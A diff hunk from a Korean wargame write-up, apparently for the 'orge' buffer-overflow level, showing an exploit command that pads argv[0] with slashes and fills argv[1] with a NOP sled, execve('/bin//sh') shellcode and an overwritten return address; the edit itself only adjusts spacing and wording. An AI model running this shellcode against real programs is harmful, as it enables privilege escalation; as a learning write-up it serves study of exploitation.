@@ -26,7 +26,7 @@ argv[1]의 주소를 확인해보니 입력해준 A와 리턴주소가 있다.
 ```
 .`python -c 'print "/"*72'`orge `python -c 'print "\x90"*19+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x9d\xfb\xff\xbf"'`
 ```
-`슬래시(/)`를 72개 넣어주어 argv[0]의 길이를 77로 맞춰주었다. 그리고 `NOP(19byte)`과 `쉘코드(25byte)`로 SFP까지 44byte 채워주었고, 그 뒤를 `argv[1]의 시작 주소`로 채워주었다.
+`슬래시(/)`를 72개 넣어주어 argv[0]의 길이를 77로 맞춰 주었다. 그리고 `NOP(19byte)`과 `쉘코드(25byte)`로 SFP까지 44byte 채워 주었고, 그 뒤인 RET을 `argv[1]의 시작 주소`로 채워 주었다.
 
 ![](./picture/orge_5.JPG)
 
